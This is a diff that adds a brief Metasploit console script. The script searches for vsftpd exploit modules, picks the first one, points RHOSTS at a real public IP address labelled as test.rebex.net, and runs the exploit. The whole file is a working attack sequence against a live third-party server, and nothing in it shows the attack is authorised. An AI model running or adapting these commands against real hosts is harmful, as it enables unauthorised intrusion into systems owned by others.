@@ -1,0 +1,13 @@
+msfconsole
+
+#vulnerability
+search vsftpd
+
+use 1
+
+#test.rebex.net
+set RHOSTS 194.108.117.16
+
+#final
+exploit
+
